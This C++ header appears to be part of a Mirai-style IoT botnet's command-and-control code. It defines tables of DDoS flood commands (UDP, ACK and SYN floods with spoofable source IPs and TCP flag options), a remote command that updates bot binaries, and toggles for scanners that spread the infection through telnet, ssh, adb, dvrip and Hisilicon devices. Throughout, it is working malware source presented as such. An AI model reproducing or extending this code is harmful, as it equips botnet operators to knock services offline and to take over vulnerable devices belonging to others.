#pragma once

#include <map>
#include <string>
#include <list>

#include "def.h"

struct command
{
    uint8_t *buf;
    uint32_t buf_len;
} PACKED;

struct process
{
    int fd;
    std::string buf;
    int buf_len;
    struct admin *ptr;
    int count, status;
    std::string f;
    std::string bot_type;
};

static std::map<std::string, uint8_t> flags =
{
    {"port", OPT_PORT},
    {"size", OPT_SIZE},
    //{"threads", OPT_THREAD_COUNT},
    {"path", OPT_HTTP_PATH},
    {"connection", OPT_HTTP_CONNECTION},
    {"domain", OPT_DOMAIN},
    {"ttl", OPT_TCP_TTL},
    {"source", OPT_TCP_SOURCE_PORT},
    {"ack", OPT_TCP_ACK},
    {"fin", OPT_TCP_FIN},
    {"urg", OPT_TCP_URG},
    {"psh", OPT_TCP_PSH},
    {"rst", OPT_TCP_RST},
    {"syn", OPT_TCP_SYN},
    {"tos", OPT_TCP_TOS},
    {"id", OPT_TCP_ID},
    {"sequence", OPT_TCP_SEQUENCE},
    {"source_ip", OPT_TCP_SOURCE_IP},
    {"ack_sequence", OPT_TCP_ACK_SEQUENCE},

    //update
    {"binary", OPT_BINARY},

    //scanner
    {"uc-httpd", OPT_UC_HTTPD},
    {"telnet",   OPT_TELNET},
    {"dvrip",    OPT_DVRIP},
    {"ssh",      OPT_SSH},
    {"adb",      OPT_ADB}

};

static std::map<std::string, std::string> flag_description =
{
    {"port", "Port given to specify the destination port of the flood (default random)"},
    {"size", "Size of each request sent by the flood (default 900)"},
   // {"threads", "Desired thread count for the specified flood (default 1)"},
    {"path", "HTTP path (default /)"},
    {"connection", "HTTP connection type (default close)"},
    {"domain", "Desired domain to be resolved by the flood"},
    {"ttl", "IP header TTL (default 255)"},
    {"source", "TCP header source port (default random)"},
    {"ack", "ACK flag set in TCP header (default 1 depending on the flood type)"},
    {"fin", "FIN flag set in TCP header"},
    {"urg", "URG flag set in TCP header"},
    {"psh", "PSH flag set in TCP header"},
    {"rst", "RST flag set in TCP header"},
    {"syn", "SYN flag set in the TCP header (default 1 depending on the flood type)"},
    {"tos", "IP header TOS"},
    {"id", "IP header ID (default random)"},
    {"sequence", "TCP header sequence (default random)"},
    {"source_ip", "IP header source IP (255.255.255.255 for random)"},
    {"ack_sequence", "TCP header ACK sequence"},
    
    //update
    {"binary", "Bot arch to be updated"},
    
    // scanner
    {"uc-httpd", "Toggle Hisilicon scanner (on/off)"},
    {"telnet", "Toggle telnet scanner (on/off)"},
    {"dvrip", "Toggle dvrip scanner (on/off)"},
    {"ssh", "Toggle ssh scanner (on/off)"},
    {"adb", "Toggle adb scanner (on/off)"}
};

static std::map<std::string, uint8_t> command_ids =
{
    // Flood
    {"udpflood", FLOOD_UDP},
    {"ackflood", FLOOD_ACK},
    {"synflood", FLOOD_SYN},
    // Commands
    {"update", COMMAND_UPDATE},
    {"scanner", COMMAND_SCANNER},
};

static std::map<std::string, std::list<uint8_t>> commands =
{
    // Floods
    {"udpflood", {OPT_PORT, OPT_SIZE}},
    {"ackflood", {OPT_PORT, OPT_SIZE, OPT_TCP_TTL, OPT_TCP_SOURCE_PORT, OPT_TCP_ACK,
                  OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
                  OPT_TCP_TOS, OPT_TCP_ID, OPT_TCP_SEQUENCE, OPT_TCP_SOURCE_IP, OPT_TCP_ACK_SEQUENCE}},
    {"synflood", {OPT_PORT, OPT_SIZE, OPT_TCP_TTL, OPT_TCP_SOURCE_PORT, OPT_TCP_ACK,
                  OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
                  OPT_TCP_TOS, OPT_TCP_ID, OPT_TCP_SEQUENCE, OPT_TCP_SOURCE_IP, OPT_TCP_ACK_SEQUENCE}},
    // Commands
    {"update", {OPT_BINARY}},
    {"scanner", {OPT_UC_HTTPD, OPT_TELNET, OPT_DVRIP, OPT_SSH, OPT_ADB}},
};

static std::map<std::string, std::string> command_description =
{
    // Floods
    {"udpflood", "UDP flood"},
    {"ackflood", "ACK flood"},
    {"synflood", "SYN flood"},
    // Commands
    {"update", "Update binary"},
    {"scanner", "Toggle scanners"}
};
